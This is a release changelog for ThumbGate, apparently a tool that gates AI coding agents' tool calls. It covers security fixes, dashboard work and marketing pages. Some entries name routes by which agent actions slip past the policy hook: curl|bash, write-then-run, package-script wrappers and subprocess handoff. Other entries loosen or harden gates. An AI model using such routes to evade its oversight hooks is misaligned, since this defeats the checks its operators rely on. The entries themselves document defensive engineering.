- [#2749](https://github.com/IgorGanapolsky/ThumbGate/pull/2749) [`86ed0cb`](https://github.com/IgorGanapolsky/ThumbGate/commit/86ed0cba7bfa37b707e574eeab51b03977dc5610) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - docs(readme): add a "Who builds ThumbGate — and hiring me" section that routes the repo's qualified readers to the maintainer's freelance/contract availability (payments, AI agents, Android). Repositions ThumbGate's credibility as a lead source per the Option-C monetization analysis; no code or runtime behavior change.

- [#2735](https://github.com/IgorGanapolsky/ThumbGate/pull/2735) [`11585b4`](https://github.com/IgorGanapolsky/ThumbGate/commit/11585b41f2ac5e15c873652eeda1a1f84df39dc9) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Never block read-only observability tools on the pending PR-thread-resolution gate. After any PR-branch commit, the gate previously denied every subsequent tool call — including pure reads like `get_business_metrics`, `dashboard`, and `describe_semantic_entity` — with "a git commit was made on a PR branch." That blinded operators to their own revenue/metrics mid-PR while doing nothing for safety (a read cannot advance a readiness claim or mutate state). Read-only tools (sourced from the canonical `readonly` MCP profile) are now exempt; mutating tools and file edits stay gated.

- [#2560](https://github.com/IgorGanapolsky/ThumbGate/pull/2560) [`26a9752`](https://github.com/IgorGanapolsky/ThumbGate/commit/26a9752ac551965f9cf98bd50891993d1632d1d4) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Remove internal AI-orchestration files from the public repo after they were called out on Reddit r/devops on 2026-06-06 as "vibe-coded" / bot-like:

  - `.claude/implementation-notes/` — internal decision/postmortem docs leaking founder sentiment + revenue state
  - `.claude/ralph/ATTEMPTS.md` — task list including "ready-to-post for Reddit, HN, Discord"
  - `.github/workflows/ralph-*.yml` + `social-engagement-hourly.yml` — hourly social-posting cadence evidence
  - `docs/marketing/reddit-posts/` — literal draft post copy

  Adds `.gitignore` entries, a pre-commit guard in `.githooks/pre-commit`, and a CI test (`tests/no-internal-orchestration-leaks.test.js`) so these path families cannot be re-introduced. Note: this only prevents future leaks — the content is still in git history; nuclear history-rewrite is a separate decision.

- [#2608](https://github.com/IgorGanapolsky/ThumbGate/pull/2608) [`50e5697`](https://github.com/IgorGanapolsky/ThumbGate/commit/50e569765866e07967924d9981f51c0cb4f6bf75) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Security: redact secrets at capture-time and export-time so ThumbGate never stores or ships a
  credential. Adds a single canonical helper `scripts/secret-redaction.js` (covers Stripe
  `sk_live_`/`sk_test_`/`rk_live_`/`rk_test_`/`whsec_`, AWS access keys, GitHub/Slack/Google/Anthropic/OpenAI
  keys, JWTs, bearer tokens, PEM private-key blocks, and generic `key=value` secret assignments;
  Stripe publishable `pk_live_` keys are intentionally preserved as public).

  It is wired into the conversation-capture writers — `feedback-history-distiller` (the
  `conversation-window.jsonl` writer, which was the incident vector), `lesson-inference` (lesson
  writer), and `self-distill-agent` (run manifest) — so a pasted key is redacted before it lands on
  disk, and into the `export-dpo-pairs` and `export-databricks-bundle` exporters so published/shared
  datasets cannot leak captured secrets (the DPO redaction also cleans the HF preferences split).
  Prompted by a 2026-06-10 incident where a live Stripe `sk_live_` key was found in plaintext in
  `.thumbgate/conversation-window.jsonl`.

  Note: the `feedback-log.jsonl` / `memory-log.jsonl` writers in `feedback-loop.js` are covered at
  the export boundary (both exporters redact when reading them); adding at-rest redaction inside
  `feedback-loop.js` is deferred to a follow-up because that file carries unrelated pre-existing
  SonarCloud findings that would block this security PR's quality gate.

- [#2697](https://github.com/IgorGanapolsky/ThumbGate/pull/2697) [`c25724c`](https://github.com/IgorGanapolsky/ThumbGate/commit/c25724c03b176834234da3d98e99b09adddfb7f6) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Refactor Reddit browser notification watch script to reduce cognitive complexity and resolve SonarCloud issues.

- [#2785](https://github.com/IgorGanapolsky/ThumbGate/pull/2785) [`adfbcec`](https://github.com/IgorGanapolsky/ThumbGate/commit/adfbcec83d0e1977dfb566df34b5feb1ba5c48b8) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Release 1.27.20 — ship a complete npm tarball.

  Published 1.27.19 was cut from an untracked working directory and omitted 32 files (including `scripts/feedback-sanitizer.js`), which crashed the UserPromptSubmit hook on every prompt. This release publishes the full file set from `main` through CI (tagged, provenance-signed) and includes the pack-integrity regression guard so an incomplete tarball can never publish again.

- [#2773](https://github.com/IgorGanapolsky/ThumbGate/pull/2773) [`6f6b022`](https://github.com/IgorGanapolsky/ThumbGate/commit/6f6b022f550faba6d4c9337d327cb8a2dc63cedf) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Remove budget gates from the PreToolUse hook path (self-lockout fix). A stale `~/.thumbgate/budget-state.json` (session_start never reset across sessions) permanently blocked every Bash/Edit/Write call — including the edits needed to repair the gate itself. The hook no longer consults budget gates at all; spend tracking remains advisory-only. `evaluateBudget()` is now advisory by default (deny requires explicit `THUMBGATE_BUDGET_ENFORCE=1`), auto-resets state older than 2× the time cap, and scopes state to a `sessionId` when provided. Regression test `tests/hook-no-budget-lockout.test.js` spawns the real hook with poisoned budget state and asserts it can never block.

- [#2754](https://github.com/IgorGanapolsky/ThumbGate/pull/2754) [`8f28fe4`](https://github.com/IgorGanapolsky/ThumbGate/commit/8f28fe4706b4b7f5c9c71db452cf0dd9f618f5a1) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Remove internal operator report, proof-artifact, and memory-log directories from the public repository, and extend the leak gate (gitignore, pre-commit hook, CI test) so they cannot return. Public guide/compare pages and the pro/landing templates now point their evidence links at docs/VERIFICATION_EVIDENCE.md instead of tracked proof-report JSON files.

- [#2559](https://github.com/IgorGanapolsky/ThumbGate/pull/2559) [`d4f6774`](https://github.com/IgorGanapolsky/ThumbGate/commit/d4f6774847d082d40e85cec78c593b1a160c4aec) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - chore: remove orphaned scripts/feedback-aggregate-stats.js (+ its unit test). The statusline aggregation that ships is feedback-aggregate.js (computeAggregateFeedbackStats); the feedback-aggregate-stats module from PR [#2545](https://github.com/IgorGanapolsky/ThumbGate/issues/2545) was superseded by a parallel implementation that landed concurrently and is referenced nowhere. Dead code removed; bundle file count decreases (within existing ceilings).

- [#2560](https://github.com/IgorGanapolsky/ThumbGate/pull/2560) [`26a9752`](https://github.com/IgorGanapolsky/ThumbGate/commit/26a9752ac551965f9cf98bd50891993d1632d1d4) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Repo credibility cleanup wave 1, after Reddit r/devops thread (2026-06-06) called the project out as a "vibe-coded" bot operation. Removes 22 social/marketing/orchestration GitHub workflows (linkedin/reddit/zernio/instagram/video dispatchers, daily-revenue-loop, gtm-autonomous-loop, weekly-social-post, reply-monitor, social-analytics-poll, etc.) and 6 root-level launch-theater markdown files (LAUNCH.md, LAUNCH_NOW.md, LAUNCH_POSTS.md, FIRST_CUSTOMER_BATTLE_PLAN.md, ALL_ENHANCEMENTS_COMPLETE.md, TEST_EVIDENCE_E2E_HYBRID_CLAW.md). Extends the pre-commit guard and CI test to permanently block re-introduction of either path family. Workflow count: 52 → 30. Tracked-line delta: -3164.

- [#2538](https://github.com/IgorGanapolsky/ThumbGate/pull/2538) [`8117974`](https://github.com/IgorGanapolsky/ThumbGate/commit/81179747a7244ae48374bf2cbea85b75b3ab65c5) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add a shared owned-site revenue assist on high-traffic ThumbGate pages with Pro checkout, workflow diagnostic CTAs, and Plausible abandonment-reason telemetry so buyer objections can be measured before Stripe checkout.

- [#2562](https://github.com/IgorGanapolsky/ThumbGate/pull/2562) [`fa0155f`](https://github.com/IgorGanapolsky/ThumbGate/commit/fa0155f472746f2ba456ea8fa925ee255cb152b8) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Tighten public repo hygiene and revenue observability: remove tracked internal agent scratchpads/social automation artifacts, add CI guards against reintroducing them, schedule Stripe checkout diagnostics on main, document canonical analytics/search-console env, and surface Google Search Console generative-AI visibility readiness in the revenue rollup.

- [#2644](https://github.com/IgorGanapolsky/ThumbGate/pull/2644) [`a89d7c9`](https://github.com/IgorGanapolsky/ThumbGate/commit/a89d7c93c338b54a4c003c8bf716b1c504644d5e) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Register the diagnostic and workflow sprint tracked offer routes and auto-list guide pages in the sitemap so paid CTAs and AI-search guide pages stay discoverable.

- [#2700](https://github.com/IgorGanapolsky/ThumbGate/pull/2700) [`38ab7d4`](https://github.com/IgorGanapolsky/ThumbGate/commit/38ab7d49b8bd7eb27dd00a670d3f10fe37575dac) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Revert the brand logo assets to the original TG gate monogram design to align with the branding displayed on Stripe checkout pages.

- [#2632](https://github.com/IgorGanapolsky/ThumbGate/pull/2632) [`ddc17f3`](https://github.com/IgorGanapolsky/ThumbGate/commit/ddc17f368e47ee2d8a692b9af363c0df7667c5dd) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Route the sticky workflow-help CTA to intake instead of a blind $499 diagnostic checkout.

- [#2725](https://github.com/IgorGanapolsky/ThumbGate/pull/2725) [`92b7f41`](https://github.com/IgorGanapolsky/ThumbGate/commit/92b7f41505889e76e47645a5909350110291dd1f) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Redact `billing:setup` operator keys by default so revenue readback setup no longer leaks live secrets into agent transcripts or shell logs.

- [#2627](https://github.com/IgorGanapolsky/ThumbGate/pull/2627) [`4c533ed`](https://github.com/IgorGanapolsky/ThumbGate/commit/4c533ed7c0af83bf1fdab060c85243d82093655c) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Surface the self-improving positioning visibly on the landing page (it was only in structured-data before). The "three steps" section now leads with "Self-improving enforcement" and a subhead clarifying the axis — self-improving for _safety_, not capability: every 👎 compiles into a hard rule, and each rule regression-tests itself so it blocks the repeat, never the safe action.

- [#2523](https://github.com/IgorGanapolsky/ThumbGate/pull/2523) [`e3a2452`](https://github.com/IgorGanapolsky/ThumbGate/commit/e3a2452ca6dafefa9959ed26dd1b3e6e7c21910a) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - seo: add canonical PreToolUse / beforeMCPExecution / MCP tool-call gating guide

  Targets the Cycode-owned IDE-security lexicon (`PreToolUse hook`, `beforeMCPExecution`, `beforeReadFile`, `beforeSubmitPrompt`) so ThumbGate occupies the indie/MIT slot beneath funded enterprise vendors in LLM answer-engine citations (Perplexity, ChatGPT, Gemini, Claude, Grok) for buyer-intent queries like "how do I stop Claude Code from running dangerous commands". Verified-absence finding in the 2026-06-05 deep-research report: ThumbGate is currently invisible in awesome-mcp-servers, the General Analysis enterprise guardrails roundup, and the Cycode-anchored category lexicon. This page fills the lexicon gap.

  New route: `/guides/claude-code-pretooluse-hook`. Registered in the seo-gsd build list and the prove-seo-gsd sitemap pin. No new dependencies, no public-bundle-ratchet impact.

- [#2792](https://github.com/IgorGanapolsky/ThumbGate/pull/2792) [`ad57632`](https://github.com/IgorGanapolsky/ThumbGate/commit/ad5763288bbf88d1cc9d771477df857f09ccc787) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add signed-entitlement boundary (the real paid-tier protection). New `scripts/entitlement.js` verifies Ed25519-signed license tokens offline (tier, features, expiry, customer id, key id, signature) against a shipped public keyset; `requireEntitlement(feature)` gates paid features — advisory by default, enforced via `THUMBGATE_ENFORCE_ENTITLEMENTS=1`. The DPO/HuggingFace/Databricks exporters now call the gate. Replaces the bypassable `tg_`/`tg_pro_` prefix check: fake prefix keys and tampered/expired/wrong-key tokens all fail verification (proven in `tests/entitlement.test.js`). The private signing key never ships (hosted billing secret / local gitignored dev key only).

- [#2521](https://github.com/IgorGanapolsky/ThumbGate/pull/2521) [`054c10d`](https://github.com/IgorGanapolsky/ThumbGate/commit/054c10d8224aa847cf9fa7b2d1c142445181e63d) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - GEO: `/sitemap.xml` now auto-includes every `public/compare/*.html` comparison page (derived from the filesystem instead of a hand-maintained list, so pages can no longer silently fall out of the sitemap), and the ThumbGate-vs-Rein comparison and Agent Manager landing pages gained FAQPage structured data — making them eligible to surface in AI Overviews / AI Mode and discoverable by AI answer engines on their buyer-intent queries.

- [#2695](https://github.com/IgorGanapolsky/ThumbGate/pull/2695) [`bf739a7`](https://github.com/IgorGanapolsky/ThumbGate/commit/bf739a72ff8f1a2dae434d250ca1357e31434855) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix premium landing page logo rendering and statusline test telemetry timeout.

- [#2564](https://github.com/IgorGanapolsky/ThumbGate/pull/2564) [`5d84509`](https://github.com/IgorGanapolsky/ThumbGate/commit/5d845090e66b07f13a09f5ba98c65e90191cec00) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Harden PreToolUse enforcement against helper-script and package-script bypasses by correlating recent helper writes with later risky execution chains.

- [#2549](https://github.com/IgorGanapolsky/ThumbGate/pull/2549) [`10f8585`](https://github.com/IgorGanapolsky/ThumbGate/commit/10f85858f4e5b751fab55249b17e1ddea3afcd95) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Statusline now aggregates across every live `statusline_cache.json` so the displayed thumbs-up/down reflects the user's true totals instead of whichever folder happens to be cwd. On a host with multiple per-project caches the same product was previously showing 74% / 20% / 0% approval depending on cwd; the aggregated readout is the correct cross-folder total. Cache writes remain per-folder so attribution is preserved; opt out of aggregation with `THUMBGATE_STATUSLINE_AGGREGATE=0`.

- [#2545](https://github.com/IgorGanapolsky/ThumbGate/pull/2545) [`109968c`](https://github.com/IgorGanapolsky/ThumbGate/commit/109968ccd5d180ab188b8a1db60e040c4609bd09) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - fix(statusline): aggregate feedback across all stores so the statusline shows the true cross-project total instead of only the slice for the folder it runs in. Previously the statusline read a single resolved feedback store, so it could show 8👍/0👎 in one repo while ~150 thumbs-down lived in another project's store. Adds a read-only cross-store sum (deduped by feedback id) over the global stores + the active project; opt back to per-folder counts with THUMBGATE_STATUSLINE_SCOPE=project. Capture/write path unchanged.

- [#2554](https://github.com/IgorGanapolsky/ThumbGate/pull/2554) [`dcc8d66`](https://github.com/IgorGanapolsky/ThumbGate/commit/dcc8d66ed9e5004e39ea60f91b87bab147d886ea) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix statusline display showing inflated thumbs counts (e.g. 1152↑/747↓ when the true cross-store total was 727↑/600↓). `scripts/statusline-cache-read.js` was summing `thumbs_up`/`thumbs_down` across every per-folder `statusline_cache.json`, but the canonical global aggregate at `~/.thumbgate/statusline_cache.json` is itself written as the cross-store sum (by `feedback-aggregate.js`). Summing the aggregate plus the per-folder caches counted every event twice. The helper now resolves the highest-priority existing cache and returns its content unchanged.

- [#2558](https://github.com/IgorGanapolsky/ThumbGate/pull/2558) [`e0d4cd1`](https://github.com/IgorGanapolsky/ThumbGate/commit/e0d4cd14918e74b9c71705f267b5767b56044bb8) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add a true end-to-end test that spawns scripts/statusline-local-stats.js as a child process and proves cross-store feedback aggregation (deduped by id), the project-scope opt-out, and the zero-store case.

- [#2549](https://github.com/IgorGanapolsky/ThumbGate/pull/2549) [`10f8585`](https://github.com/IgorGanapolsky/ThumbGate/commit/10f85858f4e5b751fab55249b17e1ddea3afcd95) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix ThumbGate statusline, dashboard, feedback stats, and local chat reads to aggregate known feedback stores instead of showing only the current folder's slice. The statusline now prefers a global aggregate cache, dedupes feedback by id across active, parent, and global project stores, and keeps a local-only opt-out with `THUMBGATE_STATUSLINE_AGGREGATE=0`.

- [#2522](https://github.com/IgorGanapolsky/ThumbGate/pull/2522) [`3989ee5`](https://github.com/IgorGanapolsky/ThumbGate/commit/3989ee5a545074a3c1a4b7737ff0181bf4da0664) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - ci: wire codex marketplace pack regeneration into sync-version.js

  The codex marketplace pack (`docs/marketing/codex-marketplace-revenue-pack.md`)
  embeds the release version in a `releases/download/v<VERSION>/` URL, but was
  not a `sync-version` target — so every release tripped the
  "checked-in Codex marketplace pack stays in sync with the generator output"
  test (caught on 1.27.3, 1.27.4/1.27.6, would have caught every future bump).

  Fix: add a `POST_SYNC_GENERATORS` step that, after the simple field-level
  version sync, invokes registered regenerator scripts (currently just
  `scripts/codex-marketplace-revenue-pack.js --write-docs`). On `--check` the
  generators are skipped (the existing per-generator test catches drift); on a
  real sync they run and re-emit the pack with the new version. Generator
  failures are logged as warnings, never break the version sync — the
  per-generator test is still the source of truth.

  Live-verified by simulating 1.27.6 → 1.27.7: pack URL auto-updated from
  `v1.27.6/...zip` to `v1.27.7/...zip` and the codex test passes 10/10.

  Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>

- [#2578](https://github.com/IgorGanapolsky/ThumbGate/pull/2578) [`96f5d11`](https://github.com/IgorGanapolsky/ThumbGate/commit/96f5d117a925039a7ae99134d139cd3a53819521) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add `THREAT_MODEL.md` — an honest, public statement of what the PreToolUse hook enforces (policy + observability layer) versus what it cannot contain (execution one layer down: curl|bash, write-then-run, package-script wrappers, subprocess handoff), and the recommended architecture of pairing the policy layer with an OS/sandbox containment boundary. Documents the shipped `stateful-helper-script-bypass` gate as defense-in-depth, not a containment substitute. Answers the r/devops review of the enforcement model.

- [#2703](https://github.com/IgorGanapolsky/ThumbGate/pull/2703) [`306ee02`](https://github.com/IgorGanapolsky/ThumbGate/commit/306ee020bb4514d3fac7f540c5b1bc79edf9f4c0) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Repair ThumbGate 1.27.15 plugin distribution metadata across Cursor, Codex, Claude, OpenCode, VS Code, MCP server cards, and public version surfaces. Add a Cursor Marketplace doctor that separates local bundle readiness from public listing approval, document the current non-live Cursor listing truth, reinstall the repo-local Codex plugin at 1.27.15, remove obsolete Zernio-only tests from the aggregate release suite, and add Z.ai helper exports used by the revenue automation smoke checks.

- [#2592](https://github.com/IgorGanapolsky/ThumbGate/pull/2592) [`2d887de`](https://github.com/IgorGanapolsky/ThumbGate/commit/2d887de30dc6a1ed02769164f9340a7831fd2f4f) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add animated demo GIF to homepage hero; web asset only.

- [#2593](https://github.com/IgorGanapolsky/ThumbGate/pull/2593) [`ec21c78`](https://github.com/IgorGanapolsky/ThumbGate/commit/ec21c784727cfc91812aaaa8a93ec3c6568f077e) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add homepage section answering 'why not write my own hooks'; web copy only.

- [#2595](https://github.com/IgorGanapolsky/ThumbGate/pull/2595) [`41299ac`](https://github.com/IgorGanapolsky/ThumbGate/commit/41299acb1243611481083cba5a13e494fda944c5) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add /compare/snowflake-cortex-agents comparison page and seo-gsd supporting entries.

- [#2596](https://github.com/IgorGanapolsky/ThumbGate/pull/2596) [`e2df6f8`](https://github.com/IgorGanapolsky/ThumbGate/commit/e2df6f82a478d27bb3015f59cebb8feb507be322) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Clarify README local-first retrieval wording to remove overclaim; docs-only, no behavior change.

- [#2640](https://github.com/IgorGanapolsky/ThumbGate/pull/2640) [`a2864e4`](https://github.com/IgorGanapolsky/ThumbGate/commit/a2864e487307272f0d4eefcc097c4f9deaaf17b5) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add vLLM serving guardrails positioning for self-hosted model-routing rollouts.

- [#2654](https://github.com/IgorGanapolsky/ThumbGate/pull/2654) [`155d86d`](https://github.com/IgorGanapolsky/ThumbGate/commit/155d86da09fde90c5f347a9553d57a2faa08e8c9) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Patch worker development dependencies to remove npm audit findings and add CI/Dependabot coverage for worker dependency vulnerabilities.

- [#2790](https://github.com/IgorGanapolsky/ThumbGate/pull/2790) [`c11d1f4`](https://github.com/IgorGanapolsky/ThumbGate/commit/c11d1f4e927397dc7efbce7d933c76e2b22d3bf4) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Security: complete HTML-attribute escaping to close reflected XSS (CodeQL js/reflected-xss [#252](https://github.com/IgorGanapolsky/ThumbGate/issues/252)). `escapeHtmlAttribute()` now escapes single quotes and backticks in addition to `& " < >`, so a `?email` search param reflected into the checkout page's `value="..."` attribute can no longer break out of the attribute context (and CodeQL recognizes it as a full sanitizer). Adds `tests/xss-checkout-escape.test.js`.

## 1.27.6

### Patch Changes

- [#2505](https://github.com/IgorGanapolsky/ThumbGate/pull/2505) [`4c24b82`](https://github.com/IgorGanapolsky/ThumbGate/commit/4c24b820862606f854e3998c475ec71a34e47b43) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix /checkout/pro zombie sessions: require customer_email on POSTs. The earlier 401 fix unblocked POST traffic, but 3 of 4 fresh POST-flow sessions then reached Stripe with customer_email=null, creating un-recoverable zombie sessions (no email = no recovery campaign possible). Now POSTs without a customer_email query param fall through to the email-capture interstitial instead of auto-confirming. GET-with-confirm=1 behavior is unchanged.

- [#2510](https://github.com/IgorGanapolsky/ThumbGate/pull/2510) [`1d51f56`](https://github.com/IgorGanapolsky/ThumbGate/commit/1d51f560793d05b441510c62284dab174ebb1200) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - dashboard: make "Chat with your data" intent-aware (lists, time windows, real listings)

  The local-first chat ([#2501](https://github.com/IgorGanapolsky/ThumbGate/issues/2501)) routed every question to one of 5 canned per-topic
  paragraphs — so "how many gates are activated today?" and "what mistakes were
  blocked today?" both returned the same `Active gates: N. Blocked: M.` line.
  Two underlying bugs:

  1. Classifier order — `/block/` hijacked "what **mistakes were blocked** today" into
     the gates topic. Feedback-specific words ("mistake", "lesson", "feedback",
     "thumbs", "negative", "positive", "wins", "what went wrong") now run FIRST.
  2. Section answers ignored intent — "what" got the same line as "how many", and
     "today" was never filtered. Now the section builder parses intent
     (`wantsList` vs count, `windowMs`: today/yesterday/this-week/this-month) and
     reads the feedback log directly to list real mistakes/wins for the requested
     window, instead of a canned all-time count.

  Examples that now answer distinctly (all still local, no cloud):

  - "how many mistakes today?" → `Feedback today: 3 (1 positive, 2 negative).`
  - "what mistakes today?" → enumerated list of today's negative contexts.
  - "show me wins this week" → enumerated list of positive entries from 7d.
  - "what gates do we have?" → enumerated list of active gates with severity.

- [#2505](https://github.com/IgorGanapolsky/ThumbGate/pull/2505) [`4c24b82`](https://github.com/IgorGanapolsky/ThumbGate/commit/4c24b820862606f854e3998c475ec71a34e47b43) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix dashboard "Chat with your data" for keyless local installs: the exact metric question "how many mistakes were prevented today?" is now covered by the local-data regression test with every cloud/model env var removed, and the dashboard copy no longer implies Gemini/Perplexity keys are required for local answers.

- [#2505](https://github.com/IgorGanapolsky/ThumbGate/pull/2505) [`4c24b82`](https://github.com/IgorGanapolsky/ThumbGate/commit/4c24b820862606f854e3998c475ec71a34e47b43) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Improve local-first dashboard chatbot to answer specific queries like "what mistakes did I make?" or "what mistakes were blocked today?" by scanning the local feedback log and listing the 5 most recent mistakes/actions instead of returning a generic summary.

- [#2507](https://github.com/IgorGanapolsky/ThumbGate/pull/2507) [`3e6ccb4`](https://github.com/IgorGanapolsky/ThumbGate/commit/3e6ccb4349511346611c29c979974989626cd3f1) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - fix(mcp): stdio server self-exits on stdin EOF/close

  stdio MCP server (adapters/mcp/server-stdio.js) now listens to stdin 'end' and 'close' events to exit the process with code 0 when the client disconnects. This prevents orphaned serve processes from accumulating on the host system.

- [#2512](https://github.com/IgorGanapolsky/ThumbGate/pull/2512) [`deb3355`](https://github.com/IgorGanapolsky/ThumbGate/commit/deb3355ea3a2a86444e335c686014a022c3a7f98) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fail closed when live Stripe webhook processing is enabled without `STRIPE_WEBHOOK_SECRET`; unsigned webhook parsing is now test-only opt-in.

## 1.27.3

### Patch Changes

- [#2447](https://github.com/IgorGanapolsky/ThumbGate/pull/2447) [`cb824a6`](https://github.com/IgorGanapolsky/ThumbGate/commit/cb824a660e4a7db2e48d8b65ba5358b598b4cd96) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add a public Agentic.ai ownership verification route so ThumbGate can be submitted to the Agentic.ai directory and measured with UTM-tagged referral traffic.

- [#2476](https://github.com/IgorGanapolsky/ThumbGate/pull/2476) [`7f927a4`](https://github.com/IgorGanapolsky/ThumbGate/commit/7f927a48b7f8c75736e17cbfde70561c6514ecec) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix /checkout/pro 401 leak: extend route guard to accept POST in addition to GET/HEAD so prospective customers whose forms or fetch() calls land via POST no longer hit the API-key auth gate. Plausible audit (2026-06-04) showed 270 "Checkout Pro Viewed" → 69 "Email Submitted" → 0 paid because POST returned HTTP 401 to every non-API-key visitor. Query params still drive Stripe session creation; POST bodies are ignored harmlessly.

  Also ship a public /about page with schema.org/Person JSON-LD and sameAs links (GitHub, LinkedIn, dev.to, Upwork, Hugging Face, X) to close the LLM-discoverability gap identified in the 2026-06-04 GEO audit — thumbgate.ai has crawl authority but Igor was previously footer-only on his own primary domain.

- [#2499](https://github.com/IgorGanapolsky/ThumbGate/pull/2499) [`5097dbb`](https://github.com/IgorGanapolsky/ThumbGate/commit/5097dbbbfcc3d4b7120a72b06973d83242c67ca0) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - ci: cap Actions artifact retention at 7 days

  14 workflows uploaded CI artifacts (proof reports, coverage, bundles, deploy
  logs, release notes) with no `retention-days`, so they kept GitHub's 90-day
  default. Combined with high push/PR/merge-queue velocity, that filled the
  account's 0.5 GB Actions storage. Set `retention-days: 7` on every artifact
  upload so storage no longer accumulates. CI/PR debugging keeps a week of
  artifacts; nothing else changes.

- [#2447](https://github.com/IgorGanapolsky/ThumbGate/pull/2447) [`cb824a6`](https://github.com/IgorGanapolsky/ThumbGate/commit/cb824a660e4a7db2e48d8b65ba5358b598b4cd96) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Document the exact Codex Desktop marketplace modal fields for the ThumbGate plugin and explain why OpenAI-only filtering hides third-party marketplace entries.

- [#2447](https://github.com/IgorGanapolsky/ThumbGate/pull/2447) [`cb824a6`](https://github.com/IgorGanapolsky/ThumbGate/commit/cb824a660e4a7db2e48d8b65ba5358b598b4cd96) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Clarify the Codex plugin install UX: make CLI setup the primary path, label the release zip as a review/offline/manual marketplace artifact, and document the Codex Desktop plugin install caveat.

- [#2447](https://github.com/IgorGanapolsky/ThumbGate/pull/2447) [`cb824a6`](https://github.com/IgorGanapolsky/ThumbGate/commit/cb824a660e4a7db2e48d8b65ba5358b598b4cd96) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Tighten the Codex plugin listing around the repeat-blocking thumbs-down workflow and keep CLI-first install guidance ahead of the portable zip bundle.

- [#2498](https://github.com/IgorGanapolsky/ThumbGate/pull/2498) [`d978bef`](https://github.com/IgorGanapolsky/ThumbGate/commit/d978bef234263ea01a4eeb36c858c133b61c3efe) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Make `thumbgate-dashboard` and `thumbgate dashboard --open` start the local dashboard API before opening the browser.

- [#2501](https://github.com/IgorGanapolsky/ThumbGate/pull/2501) [`081454f`](https://github.com/IgorGanapolsky/ThumbGate/commit/081454fbcedb2920b46abc6e5e18dff675f52dc0) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - dashboard: "Chat with your data" is local-first, not Gemini

  The dashboard chat panel routed every question through Gemini RAG over lessons
  only — so it depended on the cloud (contradicting ThumbGate's local-first thesis)
  and couldn't answer factual questions like "how many mistakes were blocked
  today?" (block counts live in gate/feedback telemetry, not lessons).

  `/v1/chat` now answers data/metric questions (gates, blocks, feedback, token
  savings, team) DETERMINISTICALLY from this install's own dashboard data — no
  cloud, no LLM, no API key. Only open-ended questions fall through to lesson
  retrieval + the user's configured LOCAL model; a BYO cloud key is optional. When
  no model is configured, open-ended questions still get a local answer instead of
  a hard "no_api_key" failure. Dashboard subtitle updated to say answers are local.

- [#2495](https://github.com/IgorGanapolsky/ThumbGate/pull/2495) [`dd16fd0`](https://github.com/IgorGanapolsky/ThumbGate/commit/dd16fd0ab2587afd66928d6e25f2cf94403dce9e) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Remove a regex hotspot from local Governed Data Chat endpoint normalization.

- [#2475](https://github.com/IgorGanapolsky/ThumbGate/pull/2475) [`aa9ae35`](https://github.com/IgorGanapolsky/ThumbGate/commit/aa9ae35a4e56efb97d35b73a0a968796948266e8) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Share deploy-scope evidence between the Railway deploy workflow and the post-merge verifier so non-runtime skips cannot mask a deploy that actually ran.

